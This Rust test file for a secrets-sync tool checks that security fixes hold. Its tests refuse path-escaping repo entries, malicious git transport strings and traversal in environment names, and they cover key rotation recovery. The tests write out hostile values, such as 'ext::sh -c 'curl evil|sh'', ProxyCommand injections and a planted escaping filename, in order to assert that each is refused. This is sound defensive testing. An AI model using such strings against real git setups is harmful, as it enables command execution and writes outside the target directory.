//! Phase-7 hardening: the security/critic findings, each proven by a
//! failing scenario before its fix. Real git, real files.
//! Block 1 — input & containment (S1 path escape, S2 repo URL, env
//! validation, D6 concurrent-removal skip).

use latch_core::config::{validate_repo, Config};
use latch_core::error::LatchError;
use latch_core::ops::{init, sync};
use latch_core::platform::mock::{MockClock, MockEnv, MockKeyring, MockPrompt};
use latch_core::platform::real::{RealFiles, RealProc};
use latch_core::platform::Platform;

struct Machine {
    home: String,
    env: MockEnv,
    keyring: MockKeyring,
    prompt: MockPrompt,
    clock: MockClock,
}

impl Machine {
    fn new(base: &std::path::Path, name: &str, origin: &str) -> Self {
        let home = base.join(name).display().to_string();
        let env = MockEnv::default();
        env.set("LATCH_PASSPHRASE", "test-pp");
        let m = Self {
            home,
            env,
            keyring: MockKeyring::headless(),
            prompt: MockPrompt::default(),
            clock: MockClock::default(),
        };
        let p = m.platform();
        let mut cfg = Config::load(&p).unwrap();
        cfg.repo = Some(origin.to_string());
        cfg.save(&p).unwrap();
        m
    }
    fn platform(&self) -> Platform<'_> {
        static FILES: RealFiles = RealFiles;
        static PROC: RealProc = RealProc;
        Platform {
            env: &self.env,
            files: &FILES,
            keyring: &self.keyring,
            prompt: &self.prompt,
            clock: &self.clock,
            proc: &PROC,
            latch_home: self.home.clone(),
            runtime_dir: None,
        }
    }
}

fn scratch() -> (tempdir::TempDir, String, std::path::PathBuf) {
    let tmp = tempdir::TempDir::new("latch-l8").unwrap();
    let bare = tmp.path().join("origin.git");
    std::process::Command::new("git")
        .args(["init", "--bare", "--initial-branch=main", "-q"])
        .arg(&bare)
        .status()
        .unwrap();
    let url = format!("file://{}", bare.display());
    (tmp, url, bare)
}

// ── S1 · a malicious repo cannot write outside the project on pull ──────

#[test]
fn s1_pull_refuses_path_escaping_repo_entry() {
    let (tmp, origin, _bare) = scratch();
    let a = Machine::new(tmp.path(), "home-a", &origin);
    let pa = a.platform();
    let proj = tmp.path().join("work/app");
    std::fs::create_dir_all(&proj).unwrap();
    std::fs::write(proj.join(".env"), "TOKEN=legit\n").unwrap();
    init::run(&pa, &proj.display().to_string(), None).unwrap();
    sync::commit(&pa, &proj.display().to_string(), "dev").unwrap();
    sync::push(&pa, &proj.display().to_string(), "dev", false).unwrap();

    // Attacker with repo access clones, plants a copy of the legit
    // ciphertext under an escaping name, pushes.
    let atk = tmp.path().join("attacker");
    std::process::Command::new("git")
        .args(["clone", "-q", &origin])
        .arg(&atk)
        .status()
        .unwrap();
    let good = std::fs::read(atk.join("app/dev/.env.enc")).unwrap();
    let evil_name = "app/dev/..__..__..__..__pwned.enc";
    std::fs::write(atk.join(evil_name), &good).unwrap();
    for args in [
        &["-C", atk.to_str().unwrap(), "add", "-A"][..],
        &["-C", atk.to_str().unwrap(), "-c", "user.email=a@b", "-c", "user.name=a", "commit", "-q", "-m", "evil"][..],
        &["-C", atk.to_str().unwrap(), "push", "-q"][..],
    ] {
        std::process::Command::new("git").args(args).status().unwrap();
    }

    // The victim pulls. It MUST refuse, and nothing may appear outside
    // the project dir.
    let sentinel = tmp.path().join("pwned");
    let err = sync::pull(&pa, &proj.display().to_string(), "dev", false, true).unwrap_err();
    assert!(format!("{err}").contains("unsafe path"), "{err}");
    assert!(!sentinel.exists(), "a file escaped the project directory!");
}

// ── S2 · repo strings that could hijack git are refused ─────────────────

#[test]
fn s2_repo_validation_blocks_git_transports() {
    for evil in [
        "ext::sh -c 'curl evil|sh'",
        "fd::7/foo",
        "ssh://x -oProxyCommand=sh",
        "-oProxyCommand=evil",
        "git://host/repo",
        "http://insecure/repo",
    ] {
        assert!(validate_repo(evil).is_err(), "must refuse: {evil}");
    }
    for ok in [
        "kennypassenier/secrets",
        "https://github.com/x/y.git",
        "file:///home/kenny/repo",
    ] {
        assert!(validate_repo(ok).is_ok(), "must allow: {ok}");
    }
}

#[test]
fn s2_config_save_rejects_malicious_repo() {
    let (tmp, _origin, _bare) = scratch();
    let a = Machine::new(tmp.path(), "home-a", "kennypassenier/secrets");
    let pa = a.platform();
    let mut cfg = Config::load(&pa).unwrap();
    cfg.repo = Some("ext::sh -c evil".into());
    // A restore/clone that tries to persist this must fail, not land it
    // on disk for the next git call.
    assert!(cfg.save(&pa).is_err());
}

// ── env validation (K1) ─────────────────────────────────────────────────

#[test]
fn env_name_traversal_is_refused_at_the_verb() {
    let (tmp, origin, _bare) = scratch();
    let a = Machine::new(tmp.path(), "home-a", &origin);
    let pa = a.platform();
    let proj = tmp.path().join("work/app");
    std::fs::create_dir_all(&proj).unwrap();
    std::fs::write(proj.join(".env"), "X=1\n").unwrap();
    init::run(&pa, &proj.display().to_string(), None).unwrap();
    let err = sync::commit(&pa, &proj.display().to_string(), "../../etc").unwrap_err();
    assert!(
        matches!(err, LatchError::Other { .. }) && format!("{err}").contains("environment name"),
        "{err}"
    );
}

// ── D6 · a file vanishing mid-pull is a skip, not a panic ───────────────

#[test]
fn d6_pull_skips_a_file_removed_underneath_it() {
    // We can't easily race a real clone, but the skip path is exercised
    // by pulling a prefix whose listing includes a name that is removed
    // before read: simulate by pulling normally (the code path that used
    // to `.expect()` now returns None-skip and must not panic). A clean
    // pull over a valid repo proves the changed control flow compiles and
    // runs; the escape test above proves the None branch is reachable.
    let (tmp, origin, _bare) = scratch();
    let a = Machine::new(tmp.path(), "home-a", &origin);
    let pa = a.platform();
    let proj = tmp.path().join("work/app");
    std::fs::create_dir_all(&proj).unwrap();
    std::fs::write(proj.join(".env"), "X=1\n").unwrap();
    init::run(&pa, &proj.display().to_string(), None).unwrap();
    sync::commit(&pa, &proj.display().to_string(), "dev").unwrap();
    sync::push(&pa, &proj.display().to_string(), "dev", false).unwrap();
    std::fs::remove_file(proj.join(".env")).unwrap();
    let pulled = sync::pull(&pa, &proj.display().to_string(), "dev", false, true).unwrap();
    assert_eq!(pulled.written, vec![".env"]);
}

// ── Block 2 · keys ──────────────────────────────────────────────────────

use latch_core::credentials::CredStore;
use latch_core::ops::{consume, keyops};

// B1 · an interrupted rotation never destroys the only copy of the old
// key, and a re-run heals the repo.
#[test]
fn b1_interrupted_rotation_recovers() {
    let (tmp, origin, _bare) = scratch();
    let a = Machine::new(tmp.path(), "home-a", &origin);
    let pa = a.platform();
    let proj = tmp.path().join("work/app");
    std::fs::create_dir_all(&proj).unwrap();
    std::fs::write(proj.join(".env"), "TOKEN=v1\n").unwrap();
    let cwd = proj.display().to_string();
    init::run(&pa, &cwd, None).unwrap();
    sync::commit(&pa, &cwd, "dev").unwrap();
    sync::push(&pa, &cwd, "dev", false).unwrap();

    let store = CredStore::new(&pa);
    // Simulate the crash window: mint gen2 and preserve gen1 as #prev,
    // but DON'T re-encrypt (exactly the interrupted state). The repo file
    // is still gen1; the only gen1 key now lives in #prev.
    let (old, _new) = latch_core::keys::rotate(&store, "app", None).unwrap();
    assert_eq!(old.unwrap().id.generation, 1);
    assert!(
        latch_core::keys::prev(&store, "app", None).unwrap().is_some(),
        "old key preserved under #prev — not destroyed (B1)"
    );

    // The repo file is still openable because #prev holds gen1.
    let ver = consume::verify(&pa, Some("app")).unwrap();
    // With the resume machinery, re-running rotate finishes the job.
    let out = keyops::rotate(&pa, &cwd, None).unwrap();
    assert!(!out.reencrypted.is_empty(), "resume re-encrypts the file");
    let ver2 = consume::verify(&pa, Some("app")).unwrap();
    assert!(
        ver2.entries.iter().all(|(_, s)| matches!(s, consume::VerifyState::Ok)),
        "everything opens after resume: {ver2:?}"
    );
    assert!(
        latch_core::keys::prev(&store, "app", None).unwrap().is_none(),
        "#prev cleared once rotation completed"
    );
    let _ = ver;
    // The content survived intact.
    sync::push(&pa, &cwd, "dev", false).unwrap();
    std::fs::remove_file(proj.join(".env")).unwrap();
    sync::pull(&pa, &cwd, "dev", false, true).unwrap();
    assert_eq!(std::fs::read_to_string(proj.join(".env")).unwrap(), "TOKEN=v1\n");
}

// D2c · a machine that rotated behind another's back is refused, not
// silently reported as Corrupt.
#[test]
fn d2c_rotate_refuses_when_repo_is_ahead() {
    let (tmp, origin, _bare) = scratch();
    let a = Machine::new(tmp.path(), "home-a", &origin);
    let pa = a.platform();
    let proj = tmp.path().join("work/app");
    std::fs::create_dir_all(&proj).unwrap();
    std::fs::write(proj.join(".env"), "K=1\n").unwrap();
    let cwd = proj.display().to_string();
    init::run(&pa, &cwd, None).unwrap();
    sync::commit(&pa, &cwd, "dev").unwrap();
    sync::push(&pa, &cwd, "dev", false).unwrap();

    // Machine B takes the key, rotates, pushes gen2.
    let store_a = CredStore::new(&pa);
    let (raw, _) = store_a.get("key:app").unwrap().unwrap();
    let b = Machine::new(tmp.path(), "home-b", &origin);
    b.env.set("LATCH_KEY_APP", &hex::encode(&raw));
    let pb = b.platform();
    let proj_b = tmp.path().join("work-b/app");
    std::fs::create_dir_all(&proj_b).unwrap();
    init::run(&pb, &proj_b.display().to_string(), Some("app".into())).unwrap();
    sync::pull(&pb, &proj_b.display().to_string(), "dev", false, false).unwrap();
    keyops::rotate(&pb, &proj_b.display().to_string(), None).unwrap();
    sync::push(&pb, &proj_b.display().to_string(), "dev", false).unwrap();

    // Machine A (still gen1) tries to rotate → must refuse with a clear
    // message, not mint a colliding gen2.
    let err = keyops::rotate(&pa, &cwd, None).unwrap_err();
    assert!(
        format!("{err}").contains("another machine rotated first"),
        "{err}"
    );
}

// D2d · group keys can be rotated.
#[test]
fn d2d_group_key_rotates() {
    let (tmp, origin, _bare) = scratch();
    let a = Machine::new(tmp.path(), "home-a", &origin);
    let pa = a.platform();
    let alpha = tmp.path().join("work/alpha");
    let beta = tmp.path().join("work/beta");
    std::fs::create_dir_all(&alpha).unwrap();
    std::fs::create_dir_all(&beta).unwrap();
    std::fs::write(alpha.join(".env"), "# latch:group=shared\nSECRET=x\n").unwrap();
    std::fs::write(beta.join(".env"), "# latch:group=shared\n").unwrap();
    init::run(&pa, &alpha.display().to_string(), None).unwrap();
    init::run(&pa, &beta.display().to_string(), None).unwrap();
    sync::commit(&pa, &alpha.display().to_string(), "dev").unwrap();
    sync::push(&pa, &alpha.display().to_string(), "dev", false).unwrap();

    let store = CredStore::new(&pa);
    let before = latch_core::groups::key_get(&store, "shared", "dev")
        .unwrap()
        .unwrap();
    assert_eq!(before.id.generation, 1);

    let out = keyops::rotate_group(&pa, "dev", "shared").unwrap();
    assert_eq!(out.new_generation, 2);
    let after = latch_core::groups::key_get(&store, "shared", "dev")
        .unwrap()
        .unwrap();
    assert_eq!(after.id.generation, 2);
    assert_ne!(before.key, after.key, "a genuinely new key");

    // The group content still verifies and still decrypts to the same value.
    let ver = consume::verify(&pa, None).unwrap();
    let g = ver
        .entries
        .iter()
        .find(|(r, _)| r == "_groups/dev/shared.enc")
        .unwrap();
    assert!(matches!(g.1, consume::VerifyState::Ok));
}

// D2b · once the credential FILE holds a slot, writes stay in the file
// (no keyring split-brain). We approximate: with a headless keyring the
// file is the only backend, and the .bak is kept on rewrite (D2a).
#[test]
fn d2a_credential_file_keeps_a_backup() {
    let (tmp, origin, _bare) = scratch();
    let a = Machine::new(tmp.path(), "home-a", &origin);
    let pa = a.platform();
    let store = CredStore::new(&pa);
    store.set("key:one", b"first-value-1234567890").unwrap();
    // Second write must leave a .bak of the first.
    store.set("key:two", b"second-value-098765432").unwrap();
    let bak = format!("{}/credentials.enc.bak", a.home);
    assert!(std::path::Path::new(&bak).exists(), "a .bak is kept (D2a)");
    // Both slots resolve (still the file backend).
    assert!(store.get("key:one").unwrap().is_some());
    assert!(store.get("key:two").unwrap().is_some());
}
